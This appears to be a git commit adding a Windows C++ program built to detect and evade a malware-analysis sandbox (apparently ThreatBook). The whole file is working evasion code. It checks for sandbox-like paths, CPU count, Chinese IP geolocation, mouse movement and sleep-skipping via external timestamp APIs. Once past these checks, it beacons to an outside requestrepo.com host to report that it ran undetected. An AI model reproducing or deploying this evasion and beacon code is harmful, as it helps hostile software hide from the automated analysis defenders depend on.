237ff26154df93324329a621d3d86639012f6a9b
yj94 <2991645986@qq.com>
2024-04-27 20:52:19 +0800

    添加项目文件。

---
+++ header.h
@@ -0,0 +1,8 @@
+#pragma once
+#define _CRT_SECURE_NO_WARNINGS
+#define WIN32_LEAN_AND_MEAN
+#include <Windows.h>
+#include <string>
+#include <regex>
+#include "httplib.h"
+#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
---
+++ main.cpp
@@ -0,0 +1,137 @@
+#include "header.h"
+
+//微步
+std::string workingdir()
+{
+    char buf[256];
+    GetCurrentDirectoryA(256, buf);
+    return std::string(buf);
+}
+bool check_run_path() {
+    std::string test(workingdir());
+    std::regex pattern("^C:\\\\[A-Za-z0-9_]+");
+    if (std::regex_match(test, pattern)) {
+        return false;
+        exit(0);
+    }
+    else {
+        return true;
+    }
+}
+//WaitForSingleObject延迟，利用拼多多时间戳api判断差值
+bool check_time() {
+    auto url = ("http://api.pinduoduo.com");
+    httplib::Client cli(url);
+    auto res = cli.Get("/api/server/_stm");
+    std::string time_str1;
+    if (res->status == 200) {
+        for (char c : res->body) {
+            if (c >= '0' && c <= '9') {
+                time_str1 += c;
+            }
+        }
+    }
+    else {
+        return false;
+    }
+    long long api_time1 = std::stoll(time_str1);
+    time_t currentTime1 = time(0);
+    //开始休眠300秒
+    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+    WaitForSingleObject(hEvent, 300000);//300s
+    CloseHandle(hEvent);
+    res = cli.Get("/api/server/_stm");
+    std::string time_str2;
+    if (res->status == 200) {
+        for (char c : res->body) {
+            if (c >= '0' && c <= '9') {
+                time_str2 += c;
+            }
+        }
+    }
+    else {
+        return false;
+    }
+    long long api_time2 = std::stoll(time_str2);
+    //判断差值
+    if (api_time2 - api_time1 > 290000) {
+        return true;
+    }
+    else {
+        exit(0);
+        return false;
+    }
+}
+bool check_cpu() {
+    SYSTEM_INFO systemInfo;
+    GetSystemInfo(&systemInfo);
+    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
+    if (numberOfProcessors < 4) {
+        return false;
+    }
+    else {
+        return true;
+    }
+}
+bool check_ip() {
+    auto url = "http://ip-api.com";
+    httplib::Client cli(url);
+    auto res = cli.Get("/csv");
+    std::string ip_str;
+    if (res->status == 200) {
+        for (char c : res->body) {
+            ip_str += c;
+        }
+    }
+    else {
+        exit(0);
+        return false;
+    }
+    if (ip_str.find("China") != std::string::npos) {
+        //std::cout << "The string contains 'China'." << std::endl;
+        return true;
+    }
+    else {
+        //std::cout << "The string does not contain 'China'." << std::endl;
+        exit(0);
+        return false;
+    }
+}
+double distance(POINT p1, POINT p2) {
+    double dx = p2.x - p1.x;
+    double dy = p2.y - p1.y;
+    return sqrt(dx * dx + dy * dy);
+}
+bool check_mouse() {
+    POINT p1, p2, p3;
+    GetCursorPos(&p1);
+    Sleep(3000);
+    GetCursorPos(&p2);
+    Sleep(3000); 
+    GetCursorPos(&p3);
+    double d1 = distance(p1, p2);
+    double d2 = distance(p2, p3);
+    double d3 = distance(p3, p1);
+    // 检查是否能构成一个类三角形
+    if ((d1 + d2 > d3) && (d2 + d3 > d1) && (d1 + d3 > d2)) {
+        return true;
+    }
+    else {
+        return false;
+    }
+}
+int main() {
+    //用于提示已经成功执行
+    if (check_time()) {
+        auto url = "ul6u2p5x.requestrepo.com";
+        httplib::Client cli(url);
+        httplib::Params p;
+        p.emplace("weibu", "true");
+        auto res = cli.Post("/", p);
+        MessageBoxA(NULL, "SUCCESS", "SUCCESS", NULL);
+    }
+    else {
+        MessageBoxA(NULL, "Fail", "Fail", NULL);
+    }
+    
+}
